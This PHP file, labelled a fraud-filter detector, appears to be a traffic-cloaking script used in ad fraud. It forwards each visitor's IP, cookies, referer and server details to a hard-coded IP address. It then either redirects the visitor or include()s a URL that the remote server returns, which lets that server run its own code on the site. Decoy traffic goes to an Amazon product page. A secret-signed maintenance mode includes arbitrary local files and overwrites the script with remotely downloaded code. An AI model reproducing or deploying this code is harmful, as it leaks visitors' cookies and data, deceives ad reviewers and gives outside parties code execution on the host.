<?php
error_reporting(0);

class FraudFilterDetector_ira2o {

    public function check() {

        ob_start();

        if (isset($_GET['ff17x_sign']) && isset($_GET['ff17x_time'])) {
            if ($this->isSignatureValid($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
                error_reporting(-1);
                $this->runInMaintenanceMode();
                die();
            }
        }

        $resultObj = $this->sendRequestAndGetResult2(false);

        if ($resultObj->result || !0) {
            $this->action($resultObj);
        }
    }

    function url_origin($s)
    {
        $ssl      = ( ! empty( $s['HTTPS'] ) && $s['HTTPS'] == 'on' );
        $sp       = strtolower( $s['SERVER_PROTOCOL'] );
        $protocol = substr( $sp, 0, strpos( $sp, '/' ) ) . ( ( $ssl ) ? 's' : '' );
        $port     = $s['SERVER_PORT'];
        $port     = ( ( ! $ssl && $port=='80' ) || ( $ssl && $port=='443' ) ) ? '' : ':'.$port;
        $host     = $s['HTTP_HOST'];
        $host     = isset( $host ) ? $host : $s['SERVER_NAME'] . $port;
        return $protocol . '://' . $host;
    }

    function full_url($s)
    {
        return $this->url_origin($s) . $s['REQUEST_URI'];
    }

    function isSignatureValid($sign, $time) {
        $str = '3d70562a-803a-4b54-a8ed-903865dbcd85.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }

    function runInMaintenanceMode() {
        global $fbIncludedFileName;
        global $fbIncludedHomeDir;

        $mode = $_GET['ff17x_mode'];
        if (!isset($mode)) {
            return $this->returnError('Maintenance mode not set');
        }

        $clid = $this->getClid();

        if ($fbIncludedFileName && $fbIncludedHomeDir) {
            $home = $fbIncludedHomeDir;
            $fileName = $fbIncludedFileName;
        } else {
            $fileName = __FILE__;
            $home = realpath(dirname(__FILE__));
        }

        if ($mode === 'upgrade') {
            return $this->upgradeScript($home, $fileName);
        } else if ($mode === 'diagnostics') {
            return $this->performDiagnostics($home, $fileName);
        } else {
            return $this->returnError('Undefined maintenance mode: '.$mode);
        }
    }

    function redirect($url) {
        if(!function_exists('headers_sent') || !headers_sent()) {
            header('Location: '.$url, true, 302);
            die();
        }
?>
    <html>
    <head>
        <title>Redirecting...</title>
        <meta name="robots" content="noindex nofollow" />
        <script type="text/javascript">
            window.location.replace('<?= $url ?>');
        </script>
        <noscript>
            <meta http-equiv="refresh" content="0;url='<?= $url ?>'" />
        </noscript>
    </head>
    <body>
        You are being redirected to <a href="<?= $url ?>" target="_top">your destination</a>.
        <script type="text/javascript">
            window.location.replace('<?= $url ?>');
        </script>
    </body>
    </html>

<?php
        die();
    }


    function returnError($message) {
         echo('{"success":false, "errorMessage":"'.$message.'"}');
    }

    function returnErrorByCode($code, $args) {
        $extErrors = array();
        $extErrors[] = array('code' => $code,'args' => $args);
        $result = array('success' => false, 'extErrors' => $extErrors, 'version' => 4);
        echo(json_encode($result));
    }

    function getClid() {
        return 'ira2o';
    }

    function appendGetParameters($url, $getParameters) {
        if ($getParameters) {
            if (strpos($url, '?') !== false) {
                return $url.'&'.$getParameters;
            } else {
                return $url.'?'.$getParameters;
            }
        }
        return $url;
    }
    function action($result) {
        if (!isset($result->type)) {
            $this->safeAction();
            return;
        }
        $type = $result->type;
        $url = $result->url;
        if ($type == 'u') {
            $this->redirect($url);
        } else if ($type == 'f') {
            include ($url);
            die();
        } else {
            $this->safeAction();
        }
    }
    function safeAction() {
        $this->redirect('https://www.amazon.com/Neleus-Athletic-Running-Workout-Shirts/dp/B07DB6N4K8/ref=sr_1_9?s=apparel&ie=UTF8&qid=1550780155&sr=1-9&nodeID=7147441011&psd=1&keywords=clothing');
    }
    function performDiagnostics($home, $fileName) {
        header("X-FF: true");
        $errors = array();
        $extErrors = array();
        
        if (isset($_GET['ff17x_checkfile'])) {
            $filename = $_GET['ff17x_checkfile'];
            $result = $this->checkFile($filename);
            echo(json_encode($result));
            return;
        }

        $success = true;
        $permissionsIssues = $this->hasPermissionsIssues($home, $fileName);
        if ($permissionsIssues) {
            $extErrors[] = $permissionsIssues;
            $success = false;
        }
        $time_start = microtime(true);
        $curlConnectionIssues = $this->getCurlConnectionIssues();
        $time_finish = microtime(true);
        $curlConnectionIssues->duration = $time_finish - $time_start;

        $time_start = microtime(true);
        $contentsConnectionIssues = $this->getContentsConnectionIssues();
        $time_finish = microtime(true);
        $contentsConnectionIssues->duration = $time_finish - $time_start;
        $result = array('success' => $success, 'version' => 6, 'diagnostics' => true, 'errors' => $errors, 'extErrors' => $extErrors, 'phpversion' => phpversion(), 'connection' => $curlConnectionIssues, 'contentsConnection' => $contentsConnectionIssues);
        echo(json_encode($result));
    }

    function getCurlConnectionIssues() {
        return $this->sendRequestAndGetResultCurl2(true);
    }

    function getContentsConnectionIssues() {
        return $this->sendRequestAndGetResultFileGetContents2(true);
    }

    function checkFile($filename) {
        $extErrors = array();
        if (!file_exists($filename)) {
            $extErrors[] = array('code' => 'FILE_NOT_FOUND','args' => array($filename));
            return array('success' => false, 'diagnostics' => true, 'extErrors' => $extErrors, 'version' => 6);
        }
        include ($filename);
        return "--- end of file inclusion ---";
    }
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 3d70562a-803a-4b54-a8ed-903865dbcd85',
                'timeout' => 2
            )
        );

        $context  = stream_context_create($opts);

        return file_get_contents($this->getFileNameForUpdates("contents"), false, $context);
    }

    function getFileNameForUpdates($type) {
        return "https://api.fraudfilter.io/v1/integration/get-updates?clid=".$this->getClid().'&integrationType=DEFAULT&type='.$type;
    }

    function upgradeScript($home, $fileName) {
        $output = $this->getUpgradeScriptViaContents($home, $fileName);
        if ($output === false || !$this->isSignature2Valid($output)) {
            $ch = curl_init($this->getFileNameForUpdates("curl"));

            $data_to_post = array();
            $headers = array();

            $headers[] = 'x-ff-secret: 3d70562a-803a-4b54-a8ed-903865dbcd85';

            curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

            $output = curl_exec($ch);

            $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

            if (!$output || strlen($output) == 0) {
                curl_close($ch);
                return $this->returnError('Server returned empty answer. HTTP error: '.$http_status);
            }

            if (strlen($output) == 0) {
                $curl_error_number = curl_errno($ch);
                curl_close($ch);
                return $this->returnErrorByCode("CURL_ERROR_".$curl_error_number, NULL);
            }

            curl_close($ch);

        }

        $tempFileName = $fileName.'.downloaded';
        $file = fopen($tempFileName, 'w');
        $saved = fwrite($file, $output);
        fclose($file);

        if (!$this->isSignature2Valid($output)) {
            return $this->returnErrorByCode("WRONG_SIGNATURE", NULL);
        }

        if (!$saved) {
            return $this->returnErrorByCode("WRITE_PERMISSION", array($tempFileName, $home));
        }
        if(!rename ($tempFileName, $fileName)) {
            return $this->returnErrorByCode("WRITE_PERMISSION", array($tempFileName, $home));
        }
        echo('{"success":true, "errorMessage":""}');
    }

    function isSignature2Valid($content) {
        return strpos($content, '@FraudFilter.io 20') !== false;
    }

    function checkSignature($content) {
        return array('code' => 'WRONG_SIGNATURE');
    }

    function hasPermissionsIssues($home, $fileName) {
        ob_start();
        $tempFileName = $fileName.'.tempfile';
        $tempFile = fopen($tempFileName, 'w');
        if ( !$tempFile ) {
            ob_end_clean();
            return array('code' => 'WRITE_PERMISSION','args' => array($tempFileName, $home));
        } else {
            ob_end_clean();
            $meta_data = stream_get_meta_data($tempFile);
            $fullfilename = $meta_data["uri"];
            fclose($tempFile);
            return unlink($tempFileName) ? "" : array('code' => 'UNABLE_TO_DELETE_TEMP_FILE','args' => array($tempFileName, $home));
        }
    }
    function concatQueryVars($originalUrl) {
        $second = $_SERVER['REQUEST_URI'];
        $url = strtok($originalUrl, '?');                                                                
        $first = parse_url($originalUrl, PHP_URL_QUERY);                                                 
        $second = parse_url($second, PHP_URL_QUERY);                                                     
        if (!$second) {
            return $originalUrl;                                                                         
        }                                                                                                
        if (!$first) {                                                                                   
            return $url . '?' . $second;
        }
        return $url . '?' . $first. '&' . $second;
    }

    function sendRequestAndGetResult2($diagnostics) {
        return $this->sendRequestAndGetResultCurl2($diagnostics);
    }

    function sendRequestAndGetResultCurl2($diagnostics) {
        $resultObj = (object)array('result' => false);

        if ($diagnostics) {
            if (!function_exists('curl_init')) {
                $resultObj->curlAnswerType = "NO_CURL";
                return $resultObj;
            }
        }

        $url = "http://130.211.20.155/ira2o";
        $nParam = '0f25e1n';
        if (isset($_GET[$nParam])) {
            $url = $url . '&'.$nParam.'='.$_GET[$nParam];
        }
        if ($diagnostics) {
            $url = $url."?diagnostics=true";
        }
        $ch = curl_init($url);

        $headers = $this->fillAllPostHeaders();

        curl_setopt($ch, CURLOPT_POST, 1);

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);

        $output = curl_exec($ch);
        $curl_error_number = curl_errno($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $output = trim($output);

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CURL_ANSWER";
            $resultObj->output = $output;
            $resultObj->httpCode = $http_status;
            $resultObj->curlErrorNumber = $curl_error_number;
        } else if ($output==='') {
            $this->notifyAboutError("EMPTY_ANSWER_curl_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
        } else if (strlen($output) <= 3) {
            $this->notifyAboutError("SHORT_ANSWER_curl_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
        } else {
            $result = $output[0];
            $sep = $output[1];
            if ($result != '0' && $result != '1' || $sep != ';') {
                $this->notifyAboutError("INVALID_PREFIX_curl_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
            }
            $resultObj->type = substr($output, 2, 1);
            $resultObj->url = substr($output, 4);
            if ($result === '1') {
                $resultObj->result = 1;
            } else if ($output === '0') {
                $resultObj->result = 0;
            }
        }

        curl_close($ch);
        return $resultObj;
    }

    function sendRequestAndGetResultFileGetContents2($diagnostics) {
        $time_start = microtime(true);

        $resultObj = (object)array('result' => false);

        $url = "http://130.211.20.155/ira2o";
        $nParam = '0f25e1n';
        if (isset($_GET[$nParam])) {
            $url = $url . '&'.$nParam.'='.$_GET[$nParam];
        }
        if ($diagnostics) {
            $url = $url."?diagnostics=true";
        }

        $headers = $this->fillAllPostHeaders();

        $postdata = http_build_query(
            $headers
        );

        $opts = array('http' =>
            array(
                'method'  => 'POST',
                'header' => $this->getHeadersAsOneString($headers),
                'timeout' => 2,
                'ignore_errors' => true
            )
        );

        $context  = stream_context_create($opts);

        $output = file_get_contents($url, false, $context);

        $output = trim($output);

        $diff = microtime(true) - $time_start;

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CONTENTS_ANSWER";
            $resultObj->output = $output;
        } else if ($output==='') {
            $this->notifyAboutError("EMPTY_ANSWER_contents_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
        } else if (strlen($output) <= 3) {
            $this->notifyAboutError("SHORT_ANSWER_contents_error_number_".$curl_error_number.'_output'.$output.'_http_status_'.$http_status);
        } else {
            $result = $output[0];
            $sep = $output[1];
            if ($result != '0' && $result != '1' || $sep != ';') {
                $this->notifyAboutError('INVALID_PREFIX_contents_diff='.$diff.'_output='.$output);
            }
            $resultObj->type = substr($output, 2, 1);
            $resultObj->url = substr($output, 4);
            if ($result === '1') {
                $resultObj->result = 1;
            } else if ($output === '0') {
                $resultObj->result = 0;
            }
        }

        return $resultObj;
    }


   function getHeadersAsOneString($headers) {
        $endline = "
";
        $answer = "";
        foreach ($headers as &$arr) {
            $answer = $answer.$arr.$endline;
        }
        return $answer;
    }

    function fillAllPostHeaders() {
        $headers = array();
        $headers[] = 'content-length: 0';
        $headers[] = 'X-FF-P: 3d70562a-803a-4b54-a8ed-903865dbcd85';
        $this->addHeader($headers, 'X-FF-REMOTE-ADDR', 'REMOTE_ADDR');
        $this->addHeader($headers, 'X-FF-X-FORWARDED-FOR', 'HTTP_X_FORWARDED_FOR');
        $this->addHeader($headers, 'X-FF-X-REAL-IP', 'HTTP_X_REAL_IP');
        $this->addHeader($headers, 'X-FF-DEVICE-STOCK-UA', 'HTTP_DEVICE_STOCK_UA');
        $this->addHeader($headers, 'X-FF-X-OPERAMINI-PHONE-UA', 'HTTP_X_OPERAMINI_PHONE_UA');
        $this->addHeader($headers, 'X-FF-HEROKU-APP-DIR', 'HEROKU_APP_DIR');
        $this->addHeader($headers, 'X-FF-X-FB-HTTP-ENGINE', 'X_FB_HTTP_ENGINE');
        $this->addHeader($headers, 'X-FF-X-PURPOSE', 'X_PURPOSE');
        $this->addHeader($headers, 'X-FF-REQUEST-SCHEME', 'REQUEST_SCHEME');
        $this->addHeader($headers, 'X-FF-CONTEXT-DOCUMENT-ROOT', 'CONTEXT_DOCUMENT_ROOT');
        $this->addHeader($headers, 'X-FF-SCRIPT-FILENAME', 'SCRIPT_FILENAME');
        $this->addHeader($headers, 'X-FF-REQUEST-URI', 'REQUEST_URI');
        $this->addHeader($headers, 'X-FF-SCRIPT-NAME', 'SCRIPT_NAME');
        $this->addHeader($headers, 'X-FF-PHP-SELF', 'PHP_SELF');
        $this->addHeader($headers, 'X-FF-REQUEST-TIME-FLOAT', 'REQUEST_TIME_FLOAT');
        $this->addHeader($headers, 'X-FF-COOKIE', 'HTTP_COOKIE');
        $this->addHeader($headers, 'X-FF-ACCEPT-ENCODING', 'HTTP_ACCEPT_ENCODING');
        $this->addHeader($headers, 'X-FF-ACCEPT-LANGUAGE', 'HTTP_ACCEPT_LANGUAGE');
        $this->addHeader($headers, 'X-FF-CF-CONNECTING-IP', 'HTTP_CF_CONNECTING_IP');
        $this->addHeader($headers, 'X-FF-INCAP-CLIENT-IP', 'HTTP_INCAP_CLIENT_IP');
        $this->addHeader($headers, 'X-FF-QUERY-STRING', 'QUERY_STRING');
        $this->addHeader($headers, 'X-FF-X-FORWARDED-FOR', 'X_FORWARDED_FOR');
        $this->addHeader($headers, 'X-FF-ACCEPT', 'HTTP_ACCEPT');
        $this->addHeader($headers, 'X-FF-X-WAP-PROFILE', 'X_WAP_PROFILE');
        $this->addHeader($headers, 'X-FF-PROFILE', 'PROFILE');
        $this->addHeader($headers, 'X-FF-WAP-PROFILE', 'WAP_PROFILE');
        $this->addHeader($headers, 'X-FF-REFERER', 'HTTP_REFERER');
        $this->addHeader($headers, 'X-FF-HOST', 'HTTP_HOST');
        $this->addHeader($headers, 'X-FF-VIA', 'HTTP_VIA');
        $this->addHeader($headers, 'X-FF-CONNECTION', 'HTTP_CONNECTION');
        $this->addHeader($headers, 'X-FF-X-REQUESTED-WITH', 'HTTP_X_REQUESTED_WITH');
        $this->addHeader($headers, 'User-Agent', 'HTTP_USER_AGENT');
        $this->addHeader($headers, 'Expected', '');

        $hh = $this->getallheadersFF();
        $counter = 0;
        foreach ($hh as $key => $value) {
            $k = strtolower($key);
            if ($k === 'host') {
                $headers[] = 'X-FF-HOST-ORDER: '.$counter;
                break;
            }
            $counter = $counter + 1;
        }
        return $headers;
    }

    function getallheadersFF() {
        $headers = '';
        foreach ( $_SERVER as $name => $value ) {
            if ( substr( $name, 0, 5 ) == 'HTTP_' ) {
                $headers[ str_replace( ' ', '-', ucwords( strtolower( str_replace( '_', ' ', substr( $name, 5 ) ) ) ) ) ] = $value;
            }
        }
        return $headers;
    }

    function addHeader(& $headers, $out, $in) {
        if (!isset( $_SERVER[$in] )) {
            return;
        }
        $value = $_SERVER[$in];
        if (is_array($value)) {
            $value = implode(',', $value);
        }
        $headers[] = $out.': '.$value;
    }

    function setError($resultObj, $code, $param1 = null, $param2 = null, $param3 = null) {
        $resultObj->errorCode = $code;
        $resultObj->error = $code;
        if ($param1 != null) {
            $resultObj->$param1 = $param1;
        }
        if ($param2 != null) {
            $resultObj->$param2 = $param2;
        }
        if ($param3 != null) {
            $resultObj->$param3 = $param3;
        }
        return $resultObj;
    }

    function notifyAboutError($message) {
        $len = strlen($message);
        if ($len > 800) {
            $message = substr($message, 0, 800);
        }
        $message = urlencode($message);

        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=ira2o&m='.$message;
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);

        $output = curl_exec($ch);
    }


}

$fraudFilterDetector_ira2o = new FraudFilterDetector_ira2o();
$fraudFilterDetector_ira2o->check();

// @FraudFilter.io 2017

?>

